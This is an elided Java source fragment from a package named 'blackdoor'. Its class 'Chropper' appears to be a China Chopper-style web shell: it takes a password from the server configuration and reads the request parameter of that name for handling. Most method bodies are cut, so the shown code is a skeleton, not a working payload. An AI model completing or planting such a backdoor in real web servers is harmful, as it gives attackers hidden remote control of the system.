package org.javaweb.server.blackdoor;
...
import org.javaweb.server.Request;
import org.javaweb.server.SysConfig;

public class Chropper {
	
	private Request request;
	
	public static String getPassword(){
		return new SysConfig().getProperties().getProperty("password");
	}
	
	public Chropper(Request request){
	...
	String FF(String s) throws Exception {
		int n;
		byte[] b = new byte[512];
	...
	public String request(){
		...
		try {
			String Z = EC(request.getParameter(getPassword()) + "");
